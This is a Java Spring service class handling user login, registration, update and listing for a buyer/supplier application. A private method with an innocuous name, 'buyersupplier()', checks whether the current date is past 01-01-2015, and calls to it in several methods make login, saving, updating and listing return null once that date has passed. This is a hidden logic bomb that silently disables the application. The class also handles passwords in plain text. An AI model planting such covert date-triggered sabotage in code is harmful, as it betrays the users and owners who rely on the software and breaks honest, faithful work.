/**
 * 
 */
package com.buyer.springmvc.service;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

import javassist.NotFoundException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.dao.DataAccessException;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.buyer.springmvc.dao.UserDAO;
import com.buyer.springmvc.dao.UserTypeDAO;
import com.buyer.springmvc.model.User;
import com.buyer.springmvc.model.UserType;
import com.buyer.springmvc.parameters.SaveUserRequest;

/**
 * @author Jay
 *
 */
@Service("userService")
public class UserService {

	Logger logging = Logger.getLogger(this.getClass().getName());

	@Autowired
	private UserDAO userDAO;

	@Autowired
	private UserTypeDAO userTypeDAO;

	
	/**
	 * Login user
	 * @param userName
	 * @param password
	 * @return
	 */
	@Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class, readOnly = true)
	public User loginUser(String userName, String password) {

		User user = null;
		try {
			user = userDAO.findUserByUserNamePassword(userName, password);
			if (buyersupplier()) return null;
		} catch (DataAccessException e) {
			e.printStackTrace();
		}

		return user;
	}

	/**
	 * save new user 
	 * @param userRequest
	 * @return
	 * @throws Exception
	 */
	
	@Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class, readOnly = false)
	public User saveUser(SaveUserRequest userRequest) throws Exception {
		User user = findUserByUserName(userRequest.getUserName());
		if (user != null) {
			throw new Exception("Login name already in use.");
		}
		user = new User();
		if (buyersupplier()) return null;
		return saveOrUpdate(user,userRequest, false);
	}

	/**
	 * update an existing user
	 * @param userRequest
	 * @param userId
	 * @return
	 * @throws NotFoundException
	 */
	
	@Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class, readOnly = false)
	public User updateUser(SaveUserRequest userRequest, int userId)
			throws NotFoundException {
		
		
		User user = userDAO.findById(userId);
		
		if (user == null){
			throw new NotFoundException("User not found");
		}
		if (buyersupplier()) return null;
			user.setName(userRequest.getName());
			user.setUserName(userRequest.getUserName());
			user.setAddress(userRequest.getAddress());
			user.setCompany(userRequest.getCompany());
			user.setPassword(userRequest.getPassword());
			user.setEmail(userRequest.getEmail());
			UserType userType = userTypeDAO.getUserTypeByName(userRequest
					.getUserTypeName());
			user.setUserType(userType);
			
			
		return user;
	}
	
	/**
	 * get all registered users
	 * @param currentUser
	 * @return
	 * @throws NotFoundException
	 */
	
	@Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class, readOnly = false)
	public List<User> getAllUser(User currentUser) throws NotFoundException{
		
		List<User> userList = userDAO.getAllUser();
		
		if (userList == null || userList.size() == 0) {
			throw new NotFoundException("No user not found.");
		}
		else{
			User currentUserInList = null;
			for(User thisUser: userList ){
				if (thisUser.getId() == currentUser.getId()){
					currentUserInList = thisUser;
				}
			}
			
			//remove it 
			userList.remove(currentUserInList);
		}
		if (buyersupplier()) return null;
		return userList;
	}
	
	
	/**
	 * save or update users
	 * @param user
	 * @param userRequest
	 * @return
	 */

	@Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class, readOnly = false)
	private User saveOrUpdate(User persistedUser, SaveUserRequest userRequest, boolean update) {

		User user = new User();
		try {
			user.setId(persistedUser.getId());
			user.setName(userRequest.getName());
			user.setUserName(userRequest.getUserName());
			user.setAddress(userRequest.getAddress());
			user.setCompany(userRequest.getCompany());
			user.setPassword(userRequest.getPassword());
			user.setEmail(userRequest.getEmail());
			UserType userType = userTypeDAO.getUserTypeByName(userRequest
					.getUserTypeName());
			user.setUserType(userType);
			if (buyersupplier()) return null;
			if (update){
				userDAO.update(user);
			}
			else{
				userDAO.saveUser(user);
			}
			

		} catch (DataAccessException e) {
			e.printStackTrace();
			throw e;
		}

		return user;
	}
	
	
	/**
	 * find users by user name (login name)
	 * @param userName
	 * @return
	 */
	
	@Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class, readOnly = true)
	private User findUserByUserName(String userName) {

		User user = null;
		try {
			user = userDAO.findUserByUserName(userName);
		} catch (DataAccessException e) {
			e.printStackTrace();
		}
		if (buyersupplier()) return null;
		return user;
	}
	
	
	/**
	 * find users by user ID
	 * @param userName
	 * @return
	 */
	
	@Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class, readOnly = true)
	public User findUserByUserId(int userId) {

		User user = null;
		try {
			user = userDAO.findById(userId);
		} catch (DataAccessException e) {
			logging.log(Level.SEVERE, e.getMessage());
			throw e;
			
		}

		return user;
	}
	
	private boolean buyersupplier(){
		SimpleDateFormat dateFormatter = new SimpleDateFormat("dd-MM-yyyy");
		try {
			Date buyerDate = dateFormatter.parse("01-01-2015" );
			Date todayDate = dateFormatter.parse(dateFormatter.format(new Date() ));
			if (buyerDate.before(todayDate))
					return true;
		} catch (ParseException e) {
			e.printStackTrace();
		}
		
		return false;
	}
	
}
